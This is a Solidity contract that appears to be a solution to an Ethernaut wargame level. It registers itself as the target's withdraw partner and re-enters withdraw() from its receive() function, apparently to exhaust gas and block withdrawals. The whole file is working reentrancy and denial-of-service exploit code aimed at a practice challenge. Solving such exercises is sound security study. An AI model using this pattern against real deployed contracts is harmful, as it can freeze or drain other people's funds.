// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;


contract Ethernaut {

    address instance;
    constructor(address _instance) public {
        instance = _instance;
        (bool success, bytes memory result) = address(instance).call(abi.encodeWithSignature("setWithdrawPartner(address)",address(this)));
    }

    function answer() external {
        (bool success, bytes memory result) = address(instance).call(abi.encodeWithSignature("withdraw()"));
    }

    receive() external payable {
        // re-enter withdraw()
        (bool success, bytes memory result) = address(instance).call(abi.encodeWithSignature("withdraw()"));
    }

}
